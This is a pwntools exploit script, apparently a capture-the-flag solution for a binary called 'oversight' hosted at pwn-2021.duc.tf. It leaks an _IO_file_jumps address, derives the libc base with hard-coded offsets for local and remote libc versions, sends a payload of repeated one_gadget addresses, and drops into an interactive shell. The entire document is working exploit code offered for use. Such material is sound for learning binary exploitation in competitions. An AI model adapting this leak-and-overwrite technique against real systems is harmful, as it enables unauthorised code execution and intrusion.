#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('oversight')
if not args.remote:
    libc = exe.libc
else: 
    libc = ELF('libc-2.27.so')

host = 'pwn-2021.duc.tf'
port = 31909

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()
if args.LOCAL:
    log.info(f"pid: {p.pid}")
p.recvuntil(b"continue")
p.send(b"1")
p.recvuntil(b"number: ")
if args.REMOTE:
    p.sendline(b"12")
else:
    p.sendline(b"13")
leak = int(p.recvuntil(b")?").split(b'\n')[0].split()[-1],16)
log.info(f"_IO_file_jumps @ {hex(leak)}")
p.sendline(b"256")

if args.REMOTE:
    libc.address = leak - 0x3e82a0 
else:
    libc.address = leak - 0x1e54c0

log.info(f"libc base @ {hex(libc.address)}")

payload = p64(libc.address+0x4f432) * 64
#256
p.sendline(payload)
p.interactive()

